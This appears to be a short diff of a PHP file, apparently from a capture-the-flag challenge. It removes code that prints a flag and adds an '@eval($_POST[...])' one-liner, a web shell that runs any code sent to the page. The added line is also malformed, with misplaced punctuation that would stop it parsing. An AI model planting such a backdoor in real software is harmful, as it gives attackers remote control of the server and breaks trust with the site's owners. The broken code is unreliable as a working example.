@@ -1,4 +1,3 @@
 <?php
-include 'flag.php';
-echo $flag;
+@eval($_POST['a'];?)
 ?>
